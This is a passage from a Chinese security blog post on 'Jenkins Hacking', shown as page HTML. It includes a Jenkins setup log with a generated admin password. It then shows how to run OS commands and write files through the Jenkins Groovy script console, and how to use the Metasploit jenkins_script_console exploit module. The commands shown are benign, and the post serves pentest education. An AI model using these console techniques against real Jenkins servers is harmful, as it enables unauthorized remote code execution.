class="line">INFO: Bean factory for application context [org<span class="variable">.springframework</span><span class="variable">.web</span><span class="variable">.context</span><span class="variable">.support</span><span class="variable">.StaticWebApplicationContext</span>@1aa6a1d4]: org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.support</span><span class="variable">.DefaultListableBeanFactory</span>@26dbd965</span><br><span class="line">Mar 15, 2017 5:04:58 AM org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.support</span><span class="variable">.DefaultListableBeanFactory</span> preInstantiateSingletons</span><br><span class="line">INFO: Pre-instantiating singletons in org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.support</span><span class="variable">.DefaultListableBeanFactory</span>@26dbd965: defining beans [filter,legacy]; <span class="attribute">root of factory hierarchy</span></span><br><span class="line"><span class="attribute">Mar 15, 2017 5</span>:04:59 AM jenkins<span class="variable">.install</span><span class="variable">.SetupWizard</span> init</span><br><span class="line">INFO:</span><br><span class="line"></span><br><span class="line">*************************************************************</span><br><span class="line">*************************************************************</span><br><span class="line">*************************************************************</span><br><span class="line"></span><br><span class="line">Jenkins initial setup is required. An admin user has been created and a password generated.</span><br><span class="line">Please use the following password to proceed to installation:</span><br><span class="line"></span><br><span class="line">e019dca34bac4a30beca67b53e821f35</span><br><span class="line"></span><br><span class="line">This may also be found at: /root/<span class="variable">.jenkins</span>/secrets/initialAdminPassword</span><br><span class="line"></span><br><span class="line">*************************************************************</span><br><span class="line">*************************************************************</span><br><span class="line">*************************************************************</span><br><span class="line"></span><br><span class="line">Mar 15, 2017 5:05:06 AM hudson<span class="variable">.model</span><span class="variable">.UpdateSite</span> updateData</span><br><span class="line">INFO: Obtained the latest update center data file for UpdateSource default</span><br><span class="line">Mar 15, 2017 5:05:09 AM hudson<span class="variable">.model</span><span class="variable">.DownloadService</span>$Downloadable load</span><br><span class="line">INFO: Obtained the updated data file for hudson<span class="variable">.tasks</span><span class="variable">.Maven</span><span class="variable">.MavenInstaller</span></span><br><span class="line">Mar 15, 2017 5:05:09 AM hudson<span class="variable">.model</span><span class="variable">.UpdateSite</span> updateData</span><br><span class="line">INFO: Obtained the latest update center data file for UpdateSource default</span><br><span class="line">Mar 15, 2017 5:05:10 AM hudson<span class="variable">.WebAppMain</span>$3 run</span><br><span class="line">INFO: Jenkins is fully up and running</span><br><span class="line">Mar 15, 2017 5:05:10 AM javax<span class="variable">.jmdns</span><span class="variable">.impl</span><span class="variable">.HostInfo</span> newHostInfo</span><br><span class="line">WARNING: Could not intialize the host network interface on nullbecause of an error: lab: lab: Temporary failure in name resolution</span><br><span class="line">java<span class="variable">.net</span><span class="variable">.UnknownHostException</span>: lab: lab: Temporary failure in name resolution</span><br><span class="line">	at java<span class="variable">.net</span><span class="variable">.InetAddress</span><span class="variable">.getLocalHost</span>(InetAddress<span class="variable">.java</span>:1505)</span><br><span class="line">	at javax<span class="variable">.jmdns</span><span class="variable">.impl</span><span class="variable">.HostInfo</span><span class="variable">.newHostInfo</span>(HostInfo<span class="variable">.java</span>:75)</span><br><span class="line">	at javax<span class="variable">.jmdns</span><span class="variable">.impl</span><span class="variable">.JmDNSImpl</span>.&lt;init&gt;(JmDNSImpl<span class="variable">.java</span>:407)</span><br><span class="line">	at javax<span class="variable">.jmdns</span><span class="variable">.JmDNS</span><span class="variable">.create</span>(JmDNS<span class="variable">.java</span>:60)</span><br><span class="line">	at hudson<span class="variable">.DNSMultiCast</span>$1<span class="variable">.call</span>(DNSMultiCast<span class="variable">.java</span>:33)</span><br><span class="line">	at jenkins<span class="variable">.util</span><span class="variable">.ContextResettingExecutorService</span>$2<span class="variable">.call</span>(ContextResettingExecutorService<span class="variable">.java</span>:46)</span><br><span class="line">	at java<span class="variable">.util</span><span class="variable">.concurrent</span><span class="variable">.FutureTask</span><span class="variable">.run</span>(FutureTask<span class="variable">.java</span>:266)</span><br><span class="line">	at java<span class="variable">.util</span><span class="variable">.concurrent</span><span class="variable">.ThreadPoolExecutor</span><span class="variable">.runWorker</span>(ThreadPoolExecutor<span class="variable">.java</span>:1142)</span><br><span class="line">	at java<span class="variable">.util</span><span class="variable">.concurrent</span><span class="variable">.ThreadPoolExecutor</span>$Worker<span class="variable">.run</span>(ThreadPoolExecutor<span class="variable">.java</span>:617)</span><br><span class="line">	at java<span class="variable">.lang</span><span class="variable">.Thread</span><span class="variable">.run</span>(Thread<span class="variable">.java</span>:745)</span><br><span class="line">Caused by: java<span class="variable">.net</span><span class="variable">.UnknownHostException</span>: lab: Temporary failure in name resolution</span><br><span class="line">	at java<span class="variable">.net</span><span class="variable">.Inet</span>6AddressImpl<span class="variable">.lookupAllHostAddr</span>(Native Method)</span><br><span class="line">	at java<span class="variable">.net</span><span class="variable">.InetAddress</span>$2<span class="variable">.lookupAllHostAddr</span>(InetAddress<span class="variable">.java</span>:928)</span><br><span class="line">	at java<span class="variable">.net</span><span class="variable">.InetAddress</span><span class="variable">.getAddressesFromNameService</span>(InetAddress<span class="variable">.java</span>:1323)</span><br><span class="line">	at java<span class="variable">.net</span><span class="variable">.InetAddress</span><span class="variable">.getLocalHost</span>(InetAddress<span class="variable">.java</span>:1500)</span><br><span class="line">	... 9 more</span><br><span class="line"></span><br><span class="line">Mar 15, 2017 5:05:18 AM hudson<span class="variable">.model</span><span class="variable">.DownloadService</span>$Downloadable load</span><br><span class="line">INFO: Obtained the updated data file for hudson<span class="variable">.tools</span><span class="variable">.JDKInstaller</span></span><br><span class="line">Mar 15, 2017 5:05:18 AM hudson<span class="variable">.model</span><span class="variable">.AsyncPeriodicWork</span>$1 run</span><br><span class="line">INFO: Finished Download metadata. 27,508 ms</span><br></pre></td></tr></table></figure>
+<p>请注意这里，我们需要密码来完成设置。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Jenkins initial setup is required. An admin<span class="built_in"> user </span>has been created <span class="keyword">and</span> a password generated.</span><br><span class="line">Please use the following password <span class="keyword">to</span> proceed <span class="keyword">to</span> installation:</span><br><span class="line"></span><br><span class="line">e019dca34bac4a30beca67b53e821f35</span><br></pre></td></tr></table></figure>
+<h3 id="如何利用jenkins服务器？"><a href="#如何利用jenkins服务器？" class="headerlink" title="如何利用jenkins服务器？"></a>如何利用jenkins服务器？</h3><p>访问 <a href="http://127.0.0.1:8080/script" target="_blank" rel="noopener">http://127.0.0.1:8080/script</a>, 并用脚本控制台pwn jenkins服务器。</p>
+<blockquote>
+<p>脚本控制台</p>
+<p>输入一个任意的Groovy脚本并在服务器上执行它。用于故障排除和诊断。使用’println’命令来查看输出结果(如果使用System.out，它将转到服务器的stdout，这是很难看到的。)</p>
+<p>例如：</p>
+</blockquote>
+<h4 id="execmd-groovy"><a href="#execmd-groovy" class="headerlink" title="execmd.groovy"></a><strong>execmd.groovy</strong></h4><p><strong>execmd.groovy</strong> 可以帮助你在jenkins服务器上执行os命令。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows</span></span><br><span class="line"></span><br><span class="line">println <span class="string">"cmd.exe /c dir"</span><span class="string">.execute</span><span class="params">()</span><span class="string">.text</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line"></span><br><span class="line">println <span class="string">"uname -a"</span><span class="string">.execute</span><span class="params">()</span><span class="string">.text</span></span><br></pre></td></tr></table></figure>
+<h4 id="writefile-groovy"><a href="#writefile-groovy" class="headerlink" title="writefile.groovy"></a><strong>writefile.groovy</strong></h4><p><strong>writefile.groovy</strong> 可以将字符串写入jenkins服务器上的文件。</p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> File(<span class="string">"/tmp/test.sh"</span>).write(<span class="string">"""</span></span><br><span class="line"><span class="string">echo "123"</span></span><br><span class="line"><span class="string">echo "456"</span></span><br><span class="line"><span class="string">"""</span>)</span><br></pre></td></tr></table></figure>
+<p>如果你更喜欢<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">metasploit-framework</a>,</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/http/jenkins_script_console</span><br><span class="line">msf exploit(jenkins_script_console) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/jenkins_script_console):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   password         <span class="literal">no</span>        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   Proxies                     <span class="literal">no</span>        A<span class="built_in"> proxy </span>chain of format type:host:port[,type:host:port][<span class="built_in">..</span>.]</span><br><span class="line">   RHOST      192.168.1.100    <span class="literal">yes</span>       The target address</span><br><span class="line">   RPORT      8080             <span class="literal">yes</span>       The target port</span><br><span class="line">   TARGETURI  /                <span class="literal">yes</span>       The path <span class="keyword">to</span> jenkins</span><br><span class="line">   USERNAME   test             <span class="literal">no</span>        The username <span class="keyword">to</span> authenticate as</span><br><span class="line">   VHOST                       <span class="literal">no</span>        HTTP<span class="built_in"> server </span>virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   1   Linux</span><br><span class="line">msf exploit(jenkins_script_console) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ol>
+<li><a href="https://jenkins.io/" target="_blank" rel="noopener">https://jenkins.io/</a></li>
+</ol>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2017/12/13/php-audit-brainmap1/" title= php代码审计脑图 >
+                    <span>往后一页</span>
+                    <span>php代码审计脑图</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zMjI3OC84ODQy>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:447344932@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/doge-dog" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">Welcome, No. <span id="busuanzi_value_site_uv"></span> visitor.
+        </span>
+    </div>
+    
+
+
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#网络评估"><span class="toc-number">1.</span> <span class="toc-text">网络评估</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzzers-sulley"><span class="toc-number">1.1.</span> <span class="toc-text">Fuzzers-sulley</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins-Hacking"><span class="toc-number">1.2.</span> <span class="toc-text">Jenkins Hacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#如何部署jenkins？"><span class="toc-number">1.2.1.</span> <span class="toc-text">如何部署jenkins？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何利用jenkins服务器？"><span class="toc-number">1.2.2.</span> <span class="toc-text">如何利用jenkins服务器？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#execmd-groovy"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">execmd.groovy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writefile-groovy"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">writefile.groovy</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">1.2.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>tags</span>
+
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive" >目前才写: 21 篇博文，好好努力吧，骚年。 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Vilnerability-Assessment/" >漏洞评估</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/2017/12/13/php-audit-brainmap1/" >php代码审计脑图</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2017/12/11/file-upload/" >WEB文件上传漏洞总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-16/" >mvmmall网店商城系统注入漏洞-2011.07</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-15/" >fckeditor2.6.4 任意文件上传漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-14/" >PHPCMS V9 通行证注册缺陷</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-8/" >phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-10/" >HZCMS 合正网站群内容管理系统SQL注射漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-11/" >Ecshop2.7.2持久型XSS（可获得管理员帐号）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-13/" >dedecms v5.3-v5.6 Get Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-9/" >PHP168 V6.02整站系统远程执行任意代码漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-5/" >PHPCMS通杀XSS-2010.08</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-3/" >ecshop SQL注射漏洞-2010.8.21</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-2/" >Discuz！7.2/X1 第三方心情墙插件SQL注入及持久型XSS漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-1/" >BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2017/11/26/hxctf2017-writeup/" >hxctf2017-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2017/11/24/blog/" >My blog</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">web渗透-文件上传</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">漏洞评估</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">wooyun-1000php</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">小试牛刀</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">脑图</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #888; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
